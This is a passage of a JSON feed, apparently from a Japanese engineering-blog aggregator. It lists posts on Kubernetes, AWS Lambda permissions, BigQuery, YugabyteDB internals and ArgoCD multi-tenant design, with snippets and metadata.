で発表した資料です。\\rhttps://3-shake.connpass.com/event/293432/\\r\\r発表のライブ配信はこちら。\\rhttps://www.youtube.com/watch?v=h1VxlvF9bls\\r\\rzennのスクラップ:\\rhttps://zenn.dev/bells17/scraps/592a02b3bc1ff3\\r\\rスライドで紹介した参考リンク集:\\r- https://github.com/kubernetes/kubernetes/tree/v1.28.2","isoDate":"2023-10-12T04:00:00.000Z","dateMiliSeconds":1697083200000,"authorName":"bells17","authorId":"bells17"},{"title":"DietPi で DLNA サーバー","link":"https://blog.1q77.com/2023/09/minidlna-on-dietpi/","contentSnippet":"Raspberry Pi 4 を買った週に Raspberry Pi 5 が発表されてちょっと悔しいところですが Windows XP 時代から OS を更新しながら使っていた古いデスクトップPCを処分したのでそこで使っていた HDD をラズパイにつないで Samba で NAS としてアクセス可能にしてみました。そこには昔ハンディカムで撮影した動画なんかも沢山保存されていたのでテレビでそれを見れるように DLNA のメディアサーバーすることにしました。","isoDate":"2023-09-30T08:33:09.000Z","dateMiliSeconds":1696062789000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"EventBridge Scheduler からの Lambda 関数起動に Lambda Permission は不要","link":"https://zenn.dev/toshikish/articles/743f69389aa99c","contentSnippet":"AWS Lambda 関数の他サービスからの呼び出しAWS Lambda 関数にはリソースベースポリシーを割り当てることができます。関数を他のサービスから呼び出すとき，通常はリソースベースポリシーにそのサービスからの実行を許可するポリシーを追加する必要があります。例えば，Amazon SNS からイベント駆動で呼び出す場合は，以下のように add-permission コマンドを実行することでポリシーを追加することができます。aws lambda add-permission --function-name example-function \\\\--action lambda...","isoDate":"2023-09-22T10:16:34.000Z","dateMiliSeconds":1695377794000,"authorName":"toshikish","authorId":"toshikish"},{"title":"WSL 2 で外部ストレージをマウント","link":"https://blog.1q77.com/2023/09/wsl2-mount-volume/","contentSnippet":"Laptop を Linux で使用していた時の遺産を WSL 環境でも使おうと XFS でフォーマットされた USB 接続の HDD をマウントする方法がないかなと思って調べたメモ。Microsoft のドキュメントにありました。","isoDate":"2023-09-21T14:08:28.000Z","dateMiliSeconds":1695305308000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"IPA試験 合格体験記/qualification-story","link":"https://speakerdeck.com/moz_sec_/qualification-story","contentSnippet":"","isoDate":"2023-09-15T04:00:00.000Z","dateMiliSeconds":1694750400000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"BigQueryの行列レベルのアクセス制御について","link":"https://zenn.dev/nedoko_dok0dko/articles/bc6a413eb623c7","contentSnippet":"whatBigQueryにおける「行列レベル」のアクセス制御について調べたことをまとめる そもそも: 行・列単位に対してのアクセス制御は可能なのか?A. できるそれぞれ記載していく 列単位https://cloud.google.com/bigquery/docs/column-level-security-intro?hl=ja列に対して事前定義したポリシータグと呼ばれるものを付与することで、特定のアカウントやグループだけが列にアクセスできる。アクセスポリシーはSQLを実行する際に確認され、許可されていないメンバーからのクエリはAccess Denitedと...","isoDate":"2023-09-14T11:46:25.000Z","dateMiliSeconds":1694691985000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Deployを使ったCloud Runのリリース","link":"https://zenn.dev/satohjohn/articles/7e6a70edc8f36e","contentSnippet":"概要Cloud RunのリリースにCloud Deployを使ってみます。 そもそもCloud Deployとはhttps://cloud.google.com/deploy?hl=jaGKE、Cloud Runのリリースを管理できるサービスになります。リリースフローを記載したパイプラインの定義を作成し、パイプラインを作成したら、フローを管理できるようになります。各フローでは基本内部でskaffoldを通して、Cloud Buildが実行される形です。Cloud Deployを使うと以下のような、リリースフローになるかと思います。Cloud BuildでImageを...","isoDate":"2023-09-13T05:47:13.000Z","dateMiliSeconds":1694584033000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetesソースコードリーディング入門","link":"https://speakerdeck.com/bells17/kubernetessosukotoriteinkuru-men","contentSnippet":"Kubernetes Novice Tokyo #27 で発表した資料です。\\rhttps://k8s-novice-jp.connpass.com/event/293144/\\r\\r発表のライブ配信はこちら。\\rTODO\\r\\rスライドで紹介した参考リンク集:\\rhttps://bells17.medium.com/things-you-should-know-about-reading-kubernetes-codes-933b0ee6181d \\rhttps://www.amazon.co.jp/dp/4297104385/\\rhttps://www.amazon.co.jp/dp/4297118378/ \\rhttps://go.dev/tour/welcome/1 \\rhttps://gopherdojo.org/studyroom/ \\rhttps://www.amazon.co.jp/dp/4621300253/ \\rhttps://speakerdeck.com/bells17/kubelet-and-containers \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp \\rhttps://speakerdeck.com/sanposhiho/zi-zuo-sitexue-bukubernetes-schedulerru-men \\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive \\rhttps://speakerdeck.com/masayaaoyama/infrastudy2-k8s \\rhttps://github.com/kubernetes/client-go/tree/master/examples/workqueue \\rhttps://github.com/kubernetes/sample-controller/blob/master/controller.go \\rhttps://github.com/kubernetes-sigs/kubebuilder \\rhttps://speakerdeck.com/bells17/kubebuilder-introduction \\rhttps://zoetrope.github.io/kubebuilder-training/ \\rhttps://github.com/cybozu-go \\rhttps://www.youtube.com/watch?v=yqB_le-N6EE \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/1602-structured-logging/README.md \\rhttps://github.com/kubernetes/enhancements/issues/1602 \\rhttps://github.com/kubernetes/klog/issues/125 \\rhttps://github.com/kubernetes/klog/pull/126 \\rhttps://github.com/kubernetes-csi \\rhttps://kubernetes-csi.github.io/docs/drivers.html \\rhttps://speakerdeck.com/bells17/introduction-to-csi \\rhttps://github.com/kubernetes/kubeadm \\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init \\rhttps://github.com/kubernetes-sigs/metrics-server \\rhttps://speakerdeck.com/bells17/metrics-server \\rhttps://speakerdeck.com/bells17/accurate-introduction \\rhttps://github.com/cybozu-go/accurate \\rhttps://slack.k8s.io/ \\rhttps://www.youtube.com/watch?v=Ayo5w-CSmP0 \\rhttps://github.com/kubernetes/community","isoDate":"2023-09-12T04:00:00.000Z","dateMiliSeconds":1694491200000,"authorName":"bells17","authorId":"bells17"},{"title":"GitHub ActionsでWorkload Identityでの認証を入れてGoogle CloudのAPIを叩く","link":"https://zenn.dev/satohjohn/articles/1645be8e83eab6","contentSnippet":"概要正直難しいと思ってたのですが、資料を読んでいくと表面上、実装は難しくありませんでした。GitHub ActionsとGoogle Cloudを連携する場合、json管理とかしなくても済むし、基本的にやっておいて損はないと思います。ユースケースとしては、例えば、GitHub Actionsで実行した結果(report)をGoogle Cloud Storageにデータを送りたいなどの際に使えると思います。Identity Poolに対して、providerは複数作成できるため、いろんな GitHub Actionsから利用されるようなパターンでも、provider:scri...","isoDate":"2023-09-11T14:17:35.000Z","dateMiliSeconds":1694441855000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"BigQueryのオンデマンド料金におけるコスト管理方法についてメモ","link":"https://zenn.dev/nedoko_dok0dko/articles/f0da04c4a70ea6","contentSnippet":"whatBigQueryにおけるコスト管理方法について、公式ドキュメントを元にメモしたログ今回はオンデマンド料金について記載のため、定額料金(BigQuery Editions)に関しては記載しない 高額請求が来てしまうパターンとはよく見かける/耳にするのは以下のような場合(あくまで一例)大量にデータをスキャンするクエリを実行するselect * 系のクエリを投げる(Table Patitionを利用したテーブルの場合)partitionで指定しないでクエリを投げる料金がかかるクエリをバッチなど利用して連続で実行してしまうTable Patition...","isoDate":"2023-09-11T01:56:24.000Z","dateMiliSeconds":1694397384000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day8","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/8_core_functions_read_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Write I/O pathを読みました。今回はArchitecture > Core functions > Read I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Read I/O pathI/O Pathはタブレットリーダーが特定されリード処理を実行する単一キーの例で説明することが出来る。Tablet leader identificationユーザーが発行したYQLクエリレイヤに作用するリードリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザリクエストはYQLレイヤで内部キーに変換され、YQLレイヤがタブレットとそれをホストするYB-TServerを発見するのに利用される。YQLレイヤはこれをYB-MasterにたしてRPC呼び出しを実行するために行なう。またそのレスポンスは将来の利用のためにキャッシュされる。その後YQLレイヤはリーダータブレットピアーをホストするYB-TServerに対してリード処理を行なう。このリード処理は内部キーを保持するタブレットのRaftグループのリーダーによって処理される。このリードリクエストを処理するRaftグループのリーダーはDocDBから読み込みを実行し、その結果をユーザーに戻す。Write I/O Pathで説明した通り、YugabyteDBのスマートクライアントではアプリケーションのリクエストを直接適切なYB-TServerに送信することが出来るため、余計なネットワークホップやマスターへのアクセスを省略することが出来る。Read operation performed by tablet leaderkという値をKというプライマリキー行に持つテーブルT1からデータを取得するケースについて考える。またテーブルT1はキー行Kと値行Vを持つものとする。1下記の画像はリード処理について説明している。YugabyteDBはデフォルトでは強整合性の読み取りを採用している。リードクエリはさらに複雑になることもある。YQLクエリレイヤーは式やビルトイン関数、算術演算を含むクエリを処理するfully-optimized2されたクエリエンジンを持っている。SELECT K,V from T1 where K = \'k\'ということ↩↩","isoDate":"2023-09-06T18:37:55.000Z","dateMiliSeconds":1694025475000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"LookMLとは","link":"https://zenn.dev/nedoko_dok0dko/articles/18a4a04b98dcb8","contentSnippet":"これは何？Looker内にある機能である「LookML」について調べたことをまとめた個人的備忘録。 LookMLとはLookMLの紹介 \xa0|\xa0 Looker \xa0|\xa0 Google CloudLookML は、Looker Modeling Language の略です。セマンティックデータモデルを作成するためにLookerで使用される言語です。LookMLを使用して、SQLデータベース内のディメンション、集計、計算、およびデータの関係を記述できます。LookMLは「Looker上で利用できる独自の言語」のことをさす　別にMLや機械学習は関係ないLookerは、Lo...","isoDate":"2023-09-05T10:46:35.000Z","dateMiliSeconds":1693910795000,"authorName":"seno","authorId":"seno"},{"title":"Nodejs(Nest.js)のアプリケーションのbuildを高速化、slim化してみようの会","link":"https://zenn.dev/satohjohn/articles/c05d29f5d68e0c","contentSnippet":"前提DockerによるNode.jsのインストール(pull)はキャッシュされているものとする.dockerignoreは以下の通りnode_modules.git.gitignore*.mddisttest 最初にまとめ軽く、そんなに依存関係が多くないアプリケーションであればnpmでstaging buildでキャッシュ効かせるぐらいでよいかもRUN --mount=type=cache,target= は効果がありそうである (https://zenn.dev/kou64yama/articles/powerful-docker-build-cache...","isoDate":"2023-09-02T10:02:16.000Z","dateMiliSeconds":1693648936000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"YugabyteDBのドキュメントを全部読む Day7","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/7_core_functions_write_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Table Creationを読みました。今回はArchitecture > Core functions > Write I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Write I/O pathWrite I/O pathはYQLレイヤーで処理され、タブレットリーダーによってレプリケーションの準備が行なわれるシングルキーでの書き込みとして例示することが出来る。アトミックなアップデートを共なう複数キーでの分散トランザクションなど複雑なケースについては分散トランザクションに記載する。Write operation processing by YQL layerユーザーが発行したYQLクエリレイヤに作用するライトリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザーリクエストはYQLレイヤで内部キーに変換される。シャーディングで説明するように、それぞれのキーは一つのタブレットが所有する。どのタブレットがキーを所有するか特定するために、YQLレイヤはYB-MasterにRPC1呼び出しを実行する。そのレスポンスは将来の利用のためにキャッシュされる。YugabyteDBはタブレットの場所をキャッシュし直接参照することでネットワークホップを減らすことで、YQLレイヤが直接適切なYB-TServerにホストされるタブレットリーダーにリクエストを送信することが出来るスマートクライアントを持つ。YQLレイヤがローカルノードにタブレットリーダーを見つけた場合、RPCはローカルファンクションコールになりリクエストをシリアライズとデシリアライズしてネットワーク越しに送信する時間を節約することが出来る。その後YQLレイヤはタブレットリーダーをホストするYB-TServerへの書き込みを発行する。この書き込みはキーを所有するRaftグループのタブレットリーダーによって処理される。Preparation of the operation for replication by tablet leader下記の図はタブレットリーダーがレプリケーションを実行する処理を説明している。タブレットのRaft Groupリーダーは以下の処理を実行する。現在実行されている処理が現在のスキーマに対応しているかを判別するキーに対してローカルin-memoryロックマネージャーを利用してロックを取得する。このロック機構はフォロワーには存在しない必要であればデータを読み込む(read-modify-writeや条件付きアップデート命令など)DocDBに書き込まれる変更のバッチを準備する。この書き込みバッチは殆ど最終的にRocksDBに書き込まれるKey-Valueペアに近く、それぞれのキーの末尾に最終的なhybrid timestampが添えられていないだけであるRaft replication of the write operation書き込みのRaftレプリケーション処理の流れは以下のように説明することが出来る。リーダーがバッチをRaft logにアペンドし、書き込みのためのhybrid timestampを選択するRaftを利用しデータをピアーに複製する成功したRaft replicationのデータをローカルのDocDBに反映するユーザーに成功を返すフォロワータブレットはRaftを利用したデータの複製を受けつけ、コミットされた事が分ったタイミングでその複製をローカルのDocDBに反映する。リーダーは以下のようにコミットポイントに於ける後続のRPCリクエストの進行を進める。書き込みバッチを含むRaftエントリーは過半数以上のタブレットRaft Groupピアーに複製されるRaftのサブシステムから\\"Replication Successful\\"のコールバックを取得したあと、リーダーはローカルのDocDBにバッチの書き込みを適用するリーダーからの次の更新でエントリーがコミットされたことがフォロワーに通知され、フォロワーはそれぞれのRocksDBインスタンスにバッチの書き込みを適用する。Response to the clientInformation Pending2Exampleskとvという値をKという行とVという行をもつテーブルT1に挿入する例について考える3。この例ではユーザーアプリケーションがランダムなYugabyteDBサーバにWriteクエリを送信し、そのサーバがリクエストを適切にルーティングすると仮定して簡略化している。特にYCQLではYugabyteDB Smart Clientを使うことで、余分なネットワークホップを避けることが出来る。↩原文ママ。過去のバージョンでも記載無し↩INSERT INTO T1 (K,V) VALUES(\'k\',\'v\')ということ↩","isoDate":"2023-08-30T16:03:36.000Z","dateMiliSeconds":1693411416000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day6","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/6_core_functions_table_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Universe creationを読みました。今回はArchitecture > Core functions > Table Creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Table CrationYugabyteDBではユーザーにより実行されるテーブルの作成はYB-Masterのリーダーが実行する非同期APIによって管理される。YB-MasterはそのAPIでテーブルのスキーマと障害耐性を高めるために形成するRaftグループに所属するYB-Masterでのテーブル作成に必要な他の情報のレプリケーションが完了した段階でAPIの成功を返す。YB-Masterのリーダーがテーブル作成を実行するときは複数のステップが存在する。ValidationYB-Masterリーダーはテーブルスキーマの検証を行ない、指定された数のタブレットを作成する。これらのタブレットはこの段階ではYB-TServerには割り振られていない。ReplicationYB-MasterリーダーはYB-MasterのRaftグループにテーブルスキーマと新しく作成されたタブレット(この時点ではYB-TServerへの割り当て行なわれていない)の複製を行なう。この処理はYB-Masterリーダに障害が発生してもテーブル作成が成功することを保証する。Acknowledgementテーブル作成処理はYB-Masterリーダーに障害が発生しても処理を継続することが出来るため、この段階で非同期テーブル作成APIは成功を返す。ExecutionYB-Masterリーダーはそれぞれのタブレットをレプリケーションファクターとして指定された数だけYB-TServerに割り当てを行なう。このタブレットピアーの配置は指定された障害耐性を実現でき、またタブレットの割り当てがYB-TServerに均等に行なわれるように実行される。タブレットのYB-TServerへの割り当てはタブレットのレプリカが複数クラウド、リージョン、アヴェイラビリティゾーンをまたいで分散するといった追加の制約を満す必要がある。Continuous monitoringYB-Masterリーダーは全てのタブレットの割り当て処理を監視し、その実行状態と完了をユーザーが実行したAPIコールに対して応答する必要がある。Examplesテーブルが4ノードからなるYugabyteDBUniverseに作成される処理について考える。このときテーブルは16のタブレットと3つのレプリケーションファクターを持つとする。YB-Masterリーダーはスキーマを検証する。また16タブレット(合計48のタブレットピアー)を作成し、Raftを利用して過半数のYB-TServerにテーブルの作成に必要なデータを複製する。作成したタブレットをRaftグループを成すYB-TServerの中の指定された数のYB-TServer割り当て、リーダーの選出を行なう。このタブレットに属するキーに対する全てのリードとライトは、タブレットピアーのリーダーとRaftグループが責任を持つ。タブレットが割り当てられると長期に渡る障害か将来のロードバランシングが発生しYB-Masterにオーナーシップを変更されるまで、割り当て先のYB-TServerが所有する。タブレットリーダーをホストするYB-TServerの内の1台に障害が発生した場合、タブレットのRaftグループはI/Oを処理するために即座にリーダーエレクションを実行する。そのためYB-MasterはI/Oにおけるクリティカルパスになることはない。レプリケーション先となる候補を探す。この複製処理は段階的かつGracefulに実行される。","isoDate":"2023-08-23T14:26:45.000Z","dateMiliSeconds":1692800805000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【ArgoCD\uD83D\uDC19️】KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/08/18/110646","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類マルチテナントパターンをArgoCDで実践する場合にオススメのパターン (★で表現)ArgoCDのNamespacedスコープモードとClusterスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜマルチテナントが必要なのかシングルテナントの場合マルチテナントの場合03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧Clusters as-a-ServiceControl Planes as-a-ServiceNamespaces as-a-Serviceカスタムリソーステナント04. ArgoCDでのテナントパターン実践一覧04-02. Clusters as-a-Service 実践実Clusterテナントオススメしない理由04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★オススメした理由04-04. Namespaces as-a-Service 実践04-05. カスタムリソーステナントの実践AppProjectテナントCLモード vs. NSモード05. CLモードなArgoCDCLモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)オススメしない理由05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)特にオススメした理由AppProjectテナント例の一覧テナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)オススメしなかった理由テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)オススメした理由テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)特にオススメした理由06. どのような誤った操作を防いでくれるのかマニフェストのデプロイ制限マニフェストをデプロイできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合カスタムリソースのReconciliation制限ArgoCD系カスタムリソースをReconciliationできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、熟成アルトバイエルンです。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19のマルチテナント化を担当しました。プロダクトが稼働するKubernetes Clusterが数十個あり、Clusterによっては複数のチームが合計100個以上のマイクロサービスを動かしています。このような大規模なマイクロサービスシステムがいくつもある状況下で、ArgoCDのマルチテナント設計の知見を深められたため、記事で解説しました。書きたいことを全部書いたところ、情報量がエグいことになってしまったため、気になる章だけでも拾って帰っていただけるとハッピーです\uD83D\uDE4FKubernetesのマルチテナントパターン (3章)ArgoCDでのテナントパターン実践一覧 (4章)ArgoCDのClusterスコープモードとNamespacedスコープモード (5章)どのような誤った操作を防いでくれるのか (6章)それでは、もりもり布教していきます\uD83D\uDE1702. なぜマルチテナントが必要なのかシングルテナントの場合そもそも、なぜArgoCDにマルチテナントが必要なのでしょうか。例えば、マニフェストのデプロイ先となるプロダクト用Cluster (例：foo、bar、baz) があると仮定します。ArgoCDをシングルテナントにする場合、各プロダクトチームの操作するApplicationを同じテナントに共存させることになります。この場合、単一のargocd-server (ダッシュボード) から全てのApplicationを操作できて便利です。しかし、プロダクト用Cluster数が増えていくにつれて、問題が起こり始めます。例えば、いずれかのプロダクトチームが誤ったApplicationを操作し、結果的に誤ったプロダクト用Clusterにマニフェストをデプロイしてしまう可能性があります。もちろん、システムでインシデントを起こしてやろうという悪意を持った人が、誤ったプロダクト用Clusterを意図的に選ぶ可能性もあります\uD83D\uDE08マルチテナントの場合その一方で、いい感じのマルチテナントにしたとします。プロダクトチームは、認可されたテナントに所属するApplicationにのみを操作でき、反対に無認可のテナントのApplicationは操作できません。これにより、誤ったプロダクト用Clusterにマニフェストをデプロイすることを防げます。03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧ArgoCDのテナント設計を実践する前に、Kubernetesにはどんなマルチテナントパターンがあるのでしょうか。Kubernetesのマルチテナントパターンは、以下に大別できます。         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      テナント単位         実Cluster         仮想Cluster         Namespace         ツール固有の論理空間      テナント間でKubernetesリソースを分離できるか         Clusterスコープリソース         ✅         ✅         ✅         ツールによる      Namespacedスコープリソース         ✅         ✅                  ツールによる      ツール         AWS EKSGCP GKEAzure AKEKubeadmなど         Kcptensile-kubevclusterVirtualClusterなど         Namespaceを増やすだけなので特別なツール不要         ArgoCDのAppProjectCapsuleのTenantkioskのAccountKubeZooのTenantなど      ▶ 他のマルチテナントの分類方法について\\"ソフトマルチテナンシー\\" と \\"ハードマルチテナンシー\\" といった分類方法もあります。この分類方法では、テナント間の分離度の観点で各マルチテナントを種別します。ソフトマルチテナンシーは、互いに信頼できる前提の上で、テナント間を弱く分離します。その一方で、ハードマルチテナンシーは、互いに信頼できない前提の上でテナント間を強く分離します。分離度がソフトとハードのいずれであるかに客観的な指標がなく、やや曖昧な種別になってしまうため、本記事の X as-a-Service の方が個人的には好みです♡♡♡The Kubernetes Book: 2024 Edition (English Edition)Multi-tenancy | KubernetesMulti-tenancy - EKS Best Practices GuidesClusters as-a-ServiceClusters as-a-Serviceは、テナントごとに独立したClusterを提供します。ツールとして、AWS EKS、GCP GKE、Azure AKE、Kubeadmなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Control Planes as-a-ServiceControl Planes as-a-Serviceは、テナントごとに独立したコントロールプレーン (言い換えば仮想Cluster) を提供します。ツールとして、Kcp、tensile-kube、vcluster、VirtualClusterなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Namespaces as-a-ServiceNamespaces as-a-Serviceは、テナントごとに独立したNamespaceを提供します。Namespaceを増やすだけなため、ツールは不要です。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?カスタムリソーステナントカスタムリソーステナントは、テナントごとにツール固有の論理空間 (例：ArgoCDのAppProject、CapsuleのTenant、kioskのAccount、KubeZooのTenantなど) を提供します。ツールによっては、X as-a-Service も兼ねている場合があります。今回紹介するAppProjectは、前述の『Namespace as-a-Service』を兼ねています。AppProjectについては、カスタムリソーステナント で解説しています。04. ArgoCDでのテナントパターン実践一覧お待たせしました。ここからは、KubernetesのマルチテナントパターンをArgoCDで具体的に実践し、おすすめのパターン実践を解説していきます。なお、オススメするものを ★ としています。         実Clusterテナント         仮想Clusterテナント         Namespaceテナント         AppProjectテナントCLモード         AppProjectテナントNSモード      対応するテナントパターン         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      ArgoCDがテナント間で占有 / 共有         占有         占有         占有         共有         占有      テナント間でKubernetesリソースを分離できるか         Namespacedスコープリソース         ✅         ✅         ✅         ✅         ✅      Clusterスコープリソース         ✅         ✅                                 オススメ                  ★                           ★★      How many do you need? Argo CD Architectures Explained - 2024 Update | Akuity以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。04-02. Clusters as-a-Service 実践実Clusterテナント実Clusterテナントは、Clusters as-a-Serviceなテナントの実践であり、実際のClusterをテナントの単位とします。後述の仮想Clusterと対比させるために、\\"実Cluster\\" と呼ぶことにします。各プロダクトチームは、実Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。オススメしない理由実Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。半年以内にアップグレードしないとサポートが切れるKubernetesクラスターが33個もあって、泣いちゃった— 長谷川 広樹 (俺です) (@Hiroki__IT) January 18, 2023  アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                    デメリットの回避策                                                                                  拡張性                 -                                                                                                                                                                     テナントを増やすために実Clusterを用意する必要があり、作業量が多い。                            ➡︎  IaCツールで実Clusterを用意するようにすれば作業量を減らせるが、やっぱりとてもつらい\uD83D\uDE2D       安全性(セキュリティ)        ClusterからClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                                  -                                                                                              ➡︎  -                                                                                                   保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に実Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  回避できず、とてもつらい\uD83D\uDE2D                                                                           性能                  Clusterのハードウェアリソースを他のテナントと奪い合うことなく、これを独占できる。                                                                                     -                                                                                              ➡︎  -                                                                                                   信頼性                 テナントごとに実Clusterが独立しており、他の実Clusterから障害の影響を受けない。                                                                                        -                                                                                              ➡︎  -                                                                                    04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★仮想Clusterテナントは、Control Planes as-a-Serviceなテナントの実践であり、仮想Clusterをテナントの単位とします。各プロダクトチームは、仮想Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Using Argo CD with vclusters. Managing deployment to multiple… | by Daniel Helfand | Argo Projectオススメした理由仮想Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                             デメリットの回避策                                                                                    拡張性                 テナントを増やすためにマニフェストで定義した仮想Clusterを用意するだけでよく、実Clusterを用意することと比べて作業量が少ない。                                          -                                                                                                       ➡︎  -                                                                                            安全性(セキュリティ)        仮想ClusterからホストClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                        -                                                                                                       ➡︎  -                                                                                                     保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に仮想Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  仮想Clusterに関する知見を持つ組織であれば、各テナントで保守できる。                                    性能                  -                                                                                                                                                                     Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                       ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                信頼性                 テナントごとに仮想Clusterが独立しており、他の仮想Clusterから障害の影響を受けない。                                                                                    -                                                                                                       ➡︎  -                                                                                      04-04. Namespaces as-a-Service 実践Namespaceテナントは、Namespaces as-a-Serviceなテナントの実践であり、Namespaceをテナントの単位とします。後述の AppProjectテナント は二重のテナントを持ち、Namespaceテナントも兼ねています。そのため、ここではNamespaceテナントの解説は省略します。04-05. カスタムリソーステナントの実践AppProjectテナントAppProjectテナントは、カスタムリソーステナントの実践であり、NamespaceとAppProjectをテナントの単位とします。AppProjectテナントは、二重のテナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持ち、\\"あらゆる面から\\" マニフェストのデプロイを制限します。特に、AppProjectはNamespaceスコープなカスタムリソースであり、自身に所属するApplicationを一括して制限します。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foo  # 自身に所属するApplicationを制限するspec: ...apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: infra-application  namespace: foospec:  # foo-tenantに所属する  project: foo-tenant  ...Argo CD in Practice: The GitOps way of managing cloud-native applications (English Edition)Projects - Argo CD - Declarative GitOps CD for Kubernetes▶ カスタムリソースの仕様について.spec.scopeキーからも分かる通り、AppProjectはNamespacedスコープなカスタムリソースであり、任意のNamespaceを設定できます\uD83D\uDC4DapiVersion: apiextensions.k8s.io/v1kind: CustomResourceDefinitionmetadata:  labels:    app.kubernetes.io/name: appprojects.argoproj.io    app.kubernetes.io/part-of: argocd  name: appprojects.argoproj.iospec:  group: argoproj.io  names:    kind: AppProject    ...  # Namespacedスコープなカスタムリソースであるとわかる  scope: Namespaced...  argo-cd/manifests/crds/appproject-crd.yaml at master \xb7 argoproj/argo-cd \xb7 GitHubExtend the Kubernetes API with CustomResourceDefinitions | KubernetesCLモード vs. NSモードArgoCDには、Clusterスコープモード と Namespacedスコープモード (以降、\\"CLモード\\" と \\"NSモード\\") があります。スコープモードに応じて、AppProjectテナントの設計方法が異なります。本章では、CLモードとNSモードの両方でAppProjectテナントを解説していきます。Applications in any namespace - Argo CD - Declarative GitOps 